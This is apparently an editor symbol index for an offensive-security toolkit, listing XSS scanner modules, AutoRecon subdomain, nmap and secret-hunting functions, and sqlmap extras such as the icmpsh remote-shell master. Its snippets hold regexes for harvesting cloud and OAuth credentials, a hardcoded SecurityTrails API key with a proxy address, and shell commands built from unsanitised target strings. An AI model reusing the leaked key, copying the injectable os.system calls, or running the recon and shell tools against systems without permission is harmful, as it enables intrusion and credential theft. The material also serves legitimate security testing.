        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "parse_qs",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "quote_plus",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "replaceValue",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "fillHoles",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "replaceValue",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "counter",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "randomUpper",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "genGen",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "extractScripts",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "isBadContext",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "equalize",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "escaped",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "extractScripts",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "stripper",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getUrl",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getParams",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "converter",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getVar",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getUrl",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getParams",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getUrl",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getParams",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getVar",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getUrl",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getParams",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "deJSON",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "js_extractor",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "handle_anchor",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "getVar",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "updateVar",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "extractHeaders",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "reader",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "converter",
        "importPath": "core.utils",
        "description": "core.utils",
        "isExtraImport": true,
        "detail": "core.utils",
        "documentation": {}
    },
    {
        "label": "checker",
        "importPath": "core.checker",
        "description": "core.checker",
        "isExtraImport": true,
        "detail": "core.checker",
        "documentation": {}
    },
    {
        "label": "checker",
        "importPath": "core.checker",
        "description": "core.checker",
        "isExtraImport": true,
        "detail": "core.checker",
        "documentation": {}
    },
    {
        "label": "jsContexter",
        "importPath": "core.jsContexter",
        "description": "core.jsContexter",
        "isExtraImport": true,
        "detail": "core.jsContexter",
        "documentation": {}
    },
    {
        "label": "dom",
        "importPath": "core.dom",
        "description": "core.dom",
        "isExtraImport": true,
        "detail": "core.dom",
        "documentation": {}
    },
    {
        "label": "dom",
        "importPath": "core.dom",
        "description": "core.dom",
        "isExtraImport": true,
        "detail": "core.dom",
        "documentation": {}
    },
    {
        "label": "zetanize",
        "importPath": "core.zetanize",
        "description": "core.zetanize",
        "isExtraImport": true,
        "detail": "core.zetanize",
        "documentation": {}
    },
    {
        "label": "retireJs",
        "importPath": "plugins.retireJs",
        "description": "plugins.retireJs",
        "isExtraImport": true,
        "detail": "plugins.retireJs",
        "documentation": {}
    },
    {
        "label": "ProtocolError",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "urllib3.exceptions",
        "description": "urllib3.exceptions",
        "isExtraImport": true,
        "detail": "urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "filterChecker",
        "importPath": "core.filterChecker",
        "description": "core.filterChecker",
        "isExtraImport": true,
        "detail": "core.filterChecker",
        "documentation": {}
    },
    {
        "label": "filterChecker",
        "importPath": "core.filterChecker",
        "description": "core.filterChecker",
        "isExtraImport": true,
        "detail": "core.filterChecker",
        "documentation": {}
    },
    {
        "label": "generator",
        "importPath": "core.generator",
        "description": "core.generator",
        "isExtraImport": true,
        "detail": "core.generator",
        "documentation": {}
    },
    {
        "label": "generator",
        "importPath": "core.generator",
        "description": "core.generator",
        "isExtraImport": true,
        "detail": "core.generator",
        "documentation": {}
    },
    {
        "label": "htmlParser",
        "importPath": "core.htmlParser",
        "description": "core.htmlParser",
        "isExtraImport": true,
        "detail": "core.htmlParser",
        "documentation": {}
    },
    {
        "label": "htmlParser",
        "importPath": "core.htmlParser",
        "description": "core.htmlParser",
        "isExtraImport": true,
        "detail": "core.htmlParser",
        "documentation": {}
    },
    {
        "label": "wafDetector",
        "importPath": "core.wafDetector",
        "description": "core.wafDetector",
        "isExtraImport": true,
        "detail": "core.wafDetector",
        "documentation": {}
    },
    {
        "label": "wafDetector",
        "importPath": "core.wafDetector",
        "description": "core.wafDetector",
        "isExtraImport": true,
        "detail": "core.wafDetector",
        "documentation": {}
    },
    {
        "label": "fuzzer",
        "importPath": "core.fuzzer",
        "description": "core.fuzzer",
        "isExtraImport": true,
        "detail": "core.fuzzer",
        "documentation": {}
    },
    {
        "label": "singleFuzz",
        "importPath": "modes.singleFuzz",
        "description": "modes.singleFuzz",
        "isExtraImport": true,
        "detail": "modes.singleFuzz",
        "documentation": {}
    },
    {
        "label": "scan",
        "importPath": "modes.scan",
        "description": "modes.scan",
        "isExtraImport": true,
        "detail": "modes.scan",
        "documentation": {}
    },
    {
        "label": "crawl",
        "importPath": "modes.crawl",
        "description": "modes.crawl",
        "isExtraImport": true,
        "detail": "modes.crawl",
        "documentation": {}
    },
    {
        "label": "bruteforcer",
        "importPath": "modes.bruteforcer",
        "description": "modes.bruteforcer",
        "isExtraImport": true,
        "detail": "modes.bruteforcer",
        "documentation": {}
    },
    {
        "label": "updater",
        "importPath": "core.updater",
        "description": "core.updater",
        "isExtraImport": true,
        "detail": "core.updater",
        "documentation": {}
    },
    {
        "label": "prompt",
        "importPath": "core.prompt",
        "description": "core.prompt",
        "isExtraImport": true,
        "detail": "core.prompt",
        "documentation": {}
    },
    {
        "label": "photon",
        "importPath": "core.photon",
        "description": "core.photon",
        "isExtraImport": true,
        "detail": "core.photon",
        "documentation": {}
    },
    {
        "label": "base64",
        "importPath": "core.encoders",
        "description": "core.encoders",
        "isExtraImport": true,
        "detail": "core.encoders",
        "documentation": {}
    },
    {
        "label": "argparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "argparse",
        "description": "argparse",
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "ArgumentParser",
        "importPath": "argparse",
        "description": "argparse",
        "isExtraImport": true,
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "HTMLParser",
        "importPath": "html.parser",
        "description": "html.parser",
        "isExtraImport": true,
        "detail": "html.parser",
        "documentation": {}
    },
    {
        "label": "asyncio",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "asyncio",
        "description": "asyncio",
        "detail": "asyncio",
        "documentation": {}
    },
    {
        "label": "aiohttp",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "aiohttp",
        "description": "aiohttp",
        "detail": "aiohttp",
        "documentation": {}
    },
    {
        "label": "web",
        "importPath": "aiohttp",
        "description": "aiohttp",
        "isExtraImport": true,
        "detail": "aiohttp",
        "documentation": {}
    },
    {
        "label": "pprint",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "pprint",
        "description": "pprint",
        "detail": "pprint",
        "documentation": {}
    },
    {
        "label": "async_timeout",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "async_timeout",
        "description": "async_timeout",
        "detail": "async_timeout",
        "documentation": {}
    },
    {
        "label": "httplib2",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "httplib2",
        "description": "httplib2",
        "detail": "httplib2",
        "documentation": {}
    },
    {
        "label": "http.client",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "http.client",
        "description": "http.client",
        "detail": "http.client",
        "documentation": {}
    },
    {
        "label": "queue",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "queue",
        "description": "queue",
        "detail": "queue",
        "documentation": {}
    },
    {
        "label": "SIGINT",
        "importPath": "signal",
        "description": "signal",
        "isExtraImport": true,
        "detail": "signal",
        "documentation": {}
    },
    {
        "label": "signal",
        "importPath": "signal",
        "description": "signal",
        "isExtraImport": true,
        "detail": "signal",
        "documentation": {}
    },
    {
        "label": "SIGINT",
        "importPath": "signal",
        "description": "signal",
        "isExtraImport": true,
        "detail": "signal",
        "documentation": {}
    },
    {
        "label": "signal",
        "importPath": "signal",
        "description": "signal",
        "isExtraImport": true,
        "detail": "signal",
        "documentation": {}
    },
    {
        "label": "urllib.error",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.error",
        "description": "urllib.error",
        "detail": "urllib.error",
        "documentation": {}
    },
    {
        "label": "urllib.request",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.request",
        "description": "urllib.request",
        "detail": "urllib.request",
        "documentation": {}
    },
    {
        "label": "colored",
        "importPath": "termcolor",
        "description": "termcolor",
        "isExtraImport": true,
        "detail": "termcolor",
        "documentation": {}
    },
    {
        "label": "Callable",
        "importPath": "collections",
        "description": "collections",
        "isExtraImport": true,
        "detail": "collections",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "Path",
        "importPath": "pathlib",
        "description": "pathlib",
        "isExtraImport": true,
        "detail": "pathlib",
        "documentation": {}
    },
    {
        "label": "urllib3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib3",
        "description": "urllib3",
        "detail": "urllib3",
        "documentation": {}
    },
    {
        "label": "NessusScan",
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "isExtraImport": true,
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "re,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re.",
        "description": "re.",
        "detail": "re.",
        "documentation": {}
    },
    {
        "label": "bs4,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "bs4.",
        "description": "bs4.",
        "detail": "bs4.",
        "documentation": {}
    },
    {
        "label": "toxin",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "toxin",
        "description": "toxin",
        "detail": "toxin",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "AutoRecon.subfolder_recon",
        "description": "AutoRecon.subfolder_recon",
        "isExtraImport": true,
        "detail": "AutoRecon.subfolder_recon",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "AutoRecon.subdomain_recon",
        "description": "AutoRecon.subdomain_recon",
        "isExtraImport": true,
        "detail": "AutoRecon.subdomain_recon",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "AutoRecon.ip_recon",
        "description": "AutoRecon.ip_recon",
        "isExtraImport": true,
        "detail": "AutoRecon.ip_recon",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "AutoRecon.find_sensitive",
        "description": "AutoRecon.find_sensitive",
        "isExtraImport": true,
        "detail": "AutoRecon.find_sensitive",
        "documentation": {}
    },
    {
        "label": "find_sensitive",
        "kind": 2,
        "importPath": "AutoRecon.find_sensitive",
        "description": "AutoRecon.find_sensitive",
        "peekOfCode": "def find_sensitive(target):\n    with open(f'Result/{target}/temp.txt', 'w') as f:\n        with open(f'Result/{target}/{target}_url/js_urls.txt',\"r\") as file1:\n            list_urls = file1.readlines()\n            for url in list_urls:\n                response = requests.get(url)\n                contents = response.text\n                for key, values in patterns.items():\n                    matches = re.findall(values, contents)\n                    if(matches):",
        "detail": "AutoRecon.find_sensitive",
        "documentation": {}
    },
    {
        "label": "patterns",
        "kind": 5,
        "importPath": "AutoRecon.find_sensitive",
        "description": "AutoRecon.find_sensitive",
        "peekOfCode": "patterns = {\n    'google_api'     : r'AIza[0-9A-Za-z-_]{35}',\n    'google_captcha' : r'6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$',\n    'google_oauth'   : r'ya29\\.[0-9A-Za-z\\-_]+',\n    'amazon_aws_access_key_id' : r'A[SK]IA[0-9A-Z]{16}',\n    'amazon_mws_auth_toke' : r'amzn\\\\.mws\\\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',\n    'amazon_aws_url' : r's3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com',\n    'facebook_access_token' : r'EAACEdEose0cBA[0-9A-Za-z]+',\n    'authorization_basic' : r'basic\\s*[a-zA-Z0-9=:_\\+\\/-]+',\n    'authorization_bearer' : r'bearer\\s*[a-zA-Z0-9_\\-\\.=:_\\+\\/]+',",
        "detail": "AutoRecon.find_sensitive",
        "documentation": {}
    },
    {
        "label": "get_ip_nmap",
        "kind": 2,
        "importPath": "AutoRecon.ip_recon",
        "description": "AutoRecon.ip_recon",
        "peekOfCode": "def get_ip_nmap(target):\n    print(\"Nmap scan...\",end=\"\\r\")\n    with open(f'Result/{target}/final_status_{target}.json',\"r\") as file1:\n            datas = json.load(file1)\n    IPs = []\n    for data in datas:\n        for key in data:\n            if data[key]['host'] not in IPs:            # unique IP\n                IPs.append(data[key]['host'])\n    threads = []",
        "detail": "AutoRecon.ip_recon",
        "documentation": {}
    },
    {
        "label": "scan_input_IP",
        "kind": 2,
        "importPath": "AutoRecon.ip_recon",
        "description": "AutoRecon.ip_recon",
        "peekOfCode": "def scan_input_IP(target):\n    print(\"Nmap scan...\",end=\"\\r\")\n    os.system(f\"nmap -sT -sV {target} >> Result/{target}/{target}_ip/nmap_{target}.txt\")\n    print(\"Nmap scan done !!!\")\n    pattern = r'(\\d+)\\/(\\w+)\\s+(\\w+)\\s+([\\w\\.\\-\\s]+?)\\s*(?:\\n|$)'\n    regex = re.compile(pattern)\n    data = []\n    list_WebIP = []\n    with open(f\"Result/{target}/{target}_ip/nmap_{target}.txt\",\"r\") as file3:\n        text_data = file3.read()",
        "detail": "AutoRecon.ip_recon",
        "documentation": {}
    },
    {
        "label": "ip_Recon",
        "kind": 2,
        "importPath": "AutoRecon.ip_recon",
        "description": "AutoRecon.ip_recon",
        "peekOfCode": "def ip_Recon(target):\n    try:\n        os.makedirs(f'Result/{target}/{target}_ip', exist_ok=True)\n    except FileExistsError:\n        pass\n    IP_regex = re.compile(r\"^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\")\n    if not IP_regex.match(target):\n        get_ip_nmap(target)\n    else:\n        scan_input_IP(target)",
        "detail": "AutoRecon.ip_recon",
        "documentation": {}
    },
    {
        "label": "call_subfinder",
        "kind": 2,
        "importPath": "AutoRecon.subdomain_recon",
        "description": "AutoRecon.subdomain_recon",
        "peekOfCode": "def call_subfinder(target):\n    print('Enumerating subdomain...',\"\\r\")\n    #Passive\n    os.system(f\"~/go/bin/subfinder -d {target} -silent -all -o Result/{target}/subdomain_{target}_subfinder.txt 2>&1 >/dev/null\")\n    proxies= {\n        'http': 'http://209.9.37.60:8087'\n    }\n    url = f\"https://api.securitytrails.com/v1/domain/{target}/subdomains\"\n    headers = {\n        \"APIKEY\": 'Tkoxcj2BbGXLwCZyFjpYyOJGaJd9XokP'",
        "detail": "AutoRecon.subdomain_recon",
        "documentation": {}
    },
    {
        "label": "sanitize_input",
        "kind": 2,
        "importPath": "AutoRecon.subdomain_recon",
        "description": "AutoRecon.subdomain_recon",
        "peekOfCode": "def sanitize_input(target):\n    os.system(f\"cat Result/{target}/subdomain_{target}_* >> Result/{target}/subdomain_{target}.txt; rm Result/{target}/subdomain_{target}_*.txt \")\n    os.system(f\"awk '!seen[$0]++' Result/{target}/subdomain_{target}.txt > Result/{target}/final_subdomain_{target}.txt; rm Result/{target}/subdomain_{target}.txt \")\n    command_probe = [f\"cat Result/{target}/final_subdomain_{target}.txt | ~/go/bin/httprobe >>  Result/{target}/{target}_live.txt\"]\n    subprocess.run(command_probe, stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL, shell=True)\n    command_httpx = [f\"cat Result/{target}/{target}_live.txt | ~/go/bin/httpx -sc -td -ip -server -nc -json -o Result/{target}/final_status_{target}.json\"]\n    subprocess.run(command_httpx, stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL, shell=True)\n    with open(f'Result/{target}/final_status_{target}.json', 'r') as f:\n            contents = f.readlines()\n    with open(f'Result/{target}/{target}_RESULT.json', 'w') as clgt:",
        "detail": "AutoRecon.subdomain_recon",
        "documentation": {}
    },
    {
        "label": "sub_Recon",
        "kind": 2,
        "importPath": "AutoRecon.subdomain_recon",
        "description": "AutoRecon.subdomain_recon",
        "peekOfCode": "def sub_Recon(target):\n    try:\n        if not(os.path.exists(f'Result/{target}')):\n            os.system(f\"mkdir Result/{target} | chmod 777 Result/{target} \")\n    except Exception as e:\n        pass\n    call_subfinder(target)\n    sanitize_input(target)\n    print(\"Enumerating subdomain done !!!\")",
        "detail": "AutoRecon.subdomain_recon",
        "documentation": {}
    },
    {
        "label": "run_command",
        "kind": 2,
        "importPath": "AutoRecon.subfolder_recon",
        "description": "AutoRecon.subfolder_recon",
        "peekOfCode": "def run_command(command):\n    os.system(command)\ndef js_recon(target):\n    try:\n        os.makedirs(f\"Result/{target}/{target}_url\", exist_ok=True)\n    except FileExistsError:\n        pass\n    print('Directory enumeration')\n    crawled_file = f\"Result/{target}/{target}_url/crawl_urls.txt\"\n    js_crawled_file = f\"Result/{target}/{target}_url/js_crawl_urls.txt\"",
        "detail": "AutoRecon.subfolder_recon",
        "documentation": {}
    },
    {
        "label": "js_recon",
        "kind": 2,
        "importPath": "AutoRecon.subfolder_recon",
        "description": "AutoRecon.subfolder_recon",
        "peekOfCode": "def js_recon(target):\n    try:\n        os.makedirs(f\"Result/{target}/{target}_url\", exist_ok=True)\n    except FileExistsError:\n        pass\n    print('Directory enumeration')\n    crawled_file = f\"Result/{target}/{target}_url/crawl_urls.txt\"\n    js_crawled_file = f\"Result/{target}/{target}_url/js_crawl_urls.txt\"\n    IP_regex = re.compile(r\"^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\")\n    if not IP_regex.match(target):",
        "detail": "AutoRecon.subfolder_recon",
        "documentation": {}
    },
    {
        "label": "beep",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.beep.beep",
        "description": "VulnScan.modules.sqlmap.extra.beep.beep",
        "peekOfCode": "def beep():\n    try:\n        if sys.platform.startswith(\"win\"):\n            _win_wav_play(BEEP_WAV_FILENAME)\n        elif sys.platform.startswith(\"darwin\"):\n            _mac_beep()\n        elif sys.platform.startswith(\"cygwin\"):\n            _cygwin_beep(BEEP_WAV_FILENAME)\n        elif any(sys.platform.startswith(_) for _ in (\"linux\", \"freebsd\")):\n            _linux_wav_play(BEEP_WAV_FILENAME)",
        "detail": "VulnScan.modules.sqlmap.extra.beep.beep",
        "documentation": {}
    },
    {
        "label": "BEEP_WAV_FILENAME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.beep.beep",
        "description": "VulnScan.modules.sqlmap.extra.beep.beep",
        "peekOfCode": "BEEP_WAV_FILENAME = os.path.join(os.path.dirname(__file__), \"beep.wav\")\ndef beep():\n    try:\n        if sys.platform.startswith(\"win\"):\n            _win_wav_play(BEEP_WAV_FILENAME)\n        elif sys.platform.startswith(\"darwin\"):\n            _mac_beep()\n        elif sys.platform.startswith(\"cygwin\"):\n            _cygwin_beep(BEEP_WAV_FILENAME)\n        elif any(sys.platform.startswith(_) for _ in (\"linux\", \"freebsd\")):",
        "detail": "VulnScan.modules.sqlmap.extra.beep.beep",
        "documentation": {}
    },
    {
        "label": "xor",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "description": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "peekOfCode": "def xor(message, key):\n    return b\"\".join(struct.pack('B', ord(message[i]) ^ ord(key[i % len(key)])) for i in range(len(message)))\ndef cloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    return xor(zlib.compress(data), KEY)\ndef decloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:",
        "detail": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "cloak",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "description": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "peekOfCode": "def cloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    return xor(zlib.compress(data), KEY)\ndef decloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    try:",
        "detail": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "decloak",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "description": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "peekOfCode": "def decloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    try:\n        data = zlib.decompress(xor(data, KEY))\n    except Exception as ex:\n        print(ex)\n        print('ERROR: the provided input file \\'%s\\' does not contain valid cloaked content' % inputFile)\n        sys.exit(1)",
        "detail": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "description": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "peekOfCode": "def main():\n    usage = '%s [-d] -i <input file> [-o <output file>]' % sys.argv[0]\n    parser = OptionParser(usage=usage, version='0.2')\n    try:\n        parser.add_option('-d', dest='decrypt', action=\"store_true\", help='Decrypt')\n        parser.add_option('-i', dest='inputFile', help='Input file')\n        parser.add_option('-o', dest='outputFile', help='Output file')\n        (args, _) = parser.parse_args()\n        if not args.inputFile:\n            parser.error('Missing the input file, -h for help')",
        "detail": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "KEY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "description": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "peekOfCode": "KEY = b\"ENWsCymUeJcXqSbD\"\ndef xor(message, key):\n    return b\"\".join(struct.pack('B', ord(message[i]) ^ ord(key[i % len(key)])) for i in range(len(message)))\ndef cloak(inputFile=None, data=None):\n    if data is None:\n        with open(inputFile, \"rb\") as f:\n            data = f.read()\n    return xor(zlib.compress(data), KEY)\ndef decloak(inputFile=None, data=None):\n    if data is None:",
        "detail": "VulnScan.modules.sqlmap.extra.cloak.cloak",
        "documentation": {}
    },
    {
        "label": "convert",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "description": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "peekOfCode": "def convert(inputFile):\n    fileStat = os.stat(inputFile)\n    fileSize = fileStat.st_size\n    if fileSize > 65280:\n        print(\"ERROR: the provided input file '%s' is too big for debug.exe\" % inputFile)\n        sys.exit(1)\n    script = \"n %s\\nr cx\\n\" % os.path.basename(inputFile.replace(\".\", \"_\"))\n    script += \"%x\\nf 0100 ffff 00\\n\" % fileSize\n    scrString = \"\"\n    counter = 256",
        "detail": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "description": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "peekOfCode": "def main(inputFile, outputFile):\n    if not os.path.isfile(inputFile):\n        print(\"ERROR: the provided input file '%s' is not a regular file\" % inputFile)\n        sys.exit(1)\n    script = convert(inputFile)\n    if outputFile:\n        fpOut = open(outputFile, \"w\")\n        sys.stdout = fpOut\n        sys.stdout.write(script)\n        sys.stdout.close()",
        "detail": "VulnScan.modules.sqlmap.extra.dbgtool.dbgtool",
        "documentation": {}
    },
    {
        "label": "setNonBlocking",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "description": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "peekOfCode": "def setNonBlocking(fd):\n    \"\"\"\n    Make a file descriptor non-blocking\n    \"\"\"\n    import fcntl\n    flags = fcntl.fcntl(fd, fcntl.F_GETFL)\n    flags = flags | os.O_NONBLOCK\n    fcntl.fcntl(fd, fcntl.F_SETFL, flags)\ndef main(src, dst):\n    if sys.platform == \"nt\":",
        "detail": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "description": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "peekOfCode": "def main(src, dst):\n    if sys.platform == \"nt\":\n        sys.stderr.write('icmpsh master can only run on Posix systems\\n')\n        sys.exit(255)\n    try:\n        from impacket import ImpactDecoder\n        from impacket import ImpactPacket\n    except ImportError:\n        sys.stderr.write('You need to install Python Impacket library first\\n')\n        sys.exit(255)",
        "detail": "VulnScan.modules.sqlmap.extra.icmpsh.icmpsh_m",
        "documentation": {}
    },
    {
        "label": "check",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.shutils.newlines",
        "description": "VulnScan.modules.sqlmap.extra.shutils.newlines",
        "peekOfCode": "def check(filepath):\n    if filepath.endswith(\".py\"):\n        content = open(filepath, \"rb\").read()\n        pattern = \"\\n\\n\\n\".encode(\"ascii\")\n        if pattern in content:\n            index = content.find(pattern)\n            print(filepath, repr(content[index - 30:index + 30]))\nif __name__ == \"__main__\":\n    try:\n        BASE_DIRECTORY = sys.argv[1]",
        "detail": "VulnScan.modules.sqlmap.extra.shutils.newlines",
        "documentation": {}
    },
    {
        "label": "ThreadingServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "class ThreadingServer(ThreadingMixIn, HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\nclass ReqHandler(BaseHTTPRequestHandler):\n    def do_REQUEST(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "ReqHandler",
        "kind": 6,
